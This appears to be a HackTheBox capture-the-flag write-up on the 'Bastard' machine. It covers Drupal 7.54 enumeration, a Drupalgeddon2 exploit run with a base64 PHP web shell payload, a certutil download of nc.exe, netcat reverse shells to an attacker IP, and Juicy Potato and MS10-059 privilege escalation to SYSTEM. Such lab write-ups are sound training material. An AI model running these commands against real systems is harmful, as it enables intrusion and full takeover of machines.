---
title: "HackTheBox - Bastard"
author: Nasrallah
description: ""
date: 2023-04-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, privilege, rce]
img_path: /assets/img/hackthebox/machines/bastard
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Bastard](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.9
Host is up (0.15s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We found three open ports, but the most important one is port 80 running IIS http web server.

### Web

Let's navigate to the web page.

![](1.png)

We found a login page of Drupal. To know the version running we can go to `/CHANGELOG.txt`.

![](2.png)

The version of Drupal running is `7.54`.

### Searchsploit

Let's see if this version is vulnerable

```terminal
$ searchsploit drupal 7.54                            
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                    | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                    | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                 | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                         | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                     | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                     | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                            | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                       | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                       | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                              | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                          | php/webapps/46459.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

This version is vulnerable to remote code execution.

## **Foothold**

The exploit for this service is know as `Drupalgeddon2`, the one I'll be using can be found [here](https://github.com/dreadlocked/Drupalgeddon2).

Now let's run the exploit

```terminal
$ ruby drupalgeddon2.rb http://10.10.10.9/                                                                                                               
[*] --==[::#Drupalggedon2::]==--                                                                                                                              
--------------------------------------------------------------------------------                                                                              
[i] Target : http://10.10.10.9/                                                                                                                               
--------------------------------------------------------------------------------                                                                              
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)                                                                                          
[+] Drupal!: v7.54                                                                                                                                            
--------------------------------------------------------------------------------                                                                              
[*] Testing: Form   (user/password)                                                                                                                           
[+] Result : Form valid                                                                                                                                       
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -                                                                               
[*] Testing: Clean URLs                                                                                                                                       
[+] Result : Clean URLs enabled                                                                                                                               
--------------------------------------------------------------------------------                                                                              
[*] Testing: Code Execution   (Method: name)                                                                                                                  
[i] Payload: echo WBPJRBLX                                                                                                                                    
[+] Result : WBPJRBLX                                                                                                                                         
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!                                                                            
--------------------------------------------------------------------------------                                                                              
[*] Testing: Existing file   (http://10.10.10.9/shell.php)                                                                                                    
[i] Response: HTTP 404 // Size: 12                                                                                                                            
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -                                                                               
[*] Testing: Writing To Web Root   (./)                                                                                                                       
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php            
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?                                                                    
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -                                                                               
[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)                                                                                      
[i] Response: HTTP 404 // Size: 12                                                                                                                            
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.p
hp
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRV
UVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php 
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands
drupalgeddon2>> whoami
nt authority\iusr
```

It tried and failed multiple time but we got command execution at the end as `nt authority\iusr`

### Reverse shell

To get a reverse shell we upload a copy of netcat to the target using the following command

```bash
certutil -urlcache -f http://10.10.17.90/nc.exe nc.exe
```

Now we setup a listener and use netcat to connect to it and execute cmd.exe

```bash
nc.exe 10.10.10.10 9001 -e cmd.exe
```

![](3.png)

## **Privilege Escalation**

### Method 1: SeImpersonatePrivilege

Let's check our privileges

```terminal
C:\inetpub\drupal-7.54>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

```

We have the `SeImpersonatePrivilege` privilege.

#### Juicy Potato

Let try Juicy Potato attack.

After uploading a copy of the [exploit](https://github.com/ohpe/juicy-potato), we run the following command.

```bash
JuicyPotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.17.90 9002" -t * 
```

![](4.png)

We got System!

### Method 2: Kernel

Let's run windows exploit suggester and see what we get

```terminal
$ python2 windows-exploit-suggester.py --database 2023-04-05-mssb.xls --systeminfo sysinfo.txt                                                     130 ⨯
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

The target system is pretty old (Windows server 2008) and we got multiple exploit to try.

One exploit that i try first is `MS10-059`, a copy of the executable can be found [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe).

Now we upload the exploit to the target and run it

```bash
MS10-059.exe 10.10.17.90 9999
```

![](5.png)

We got SYSTEM.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).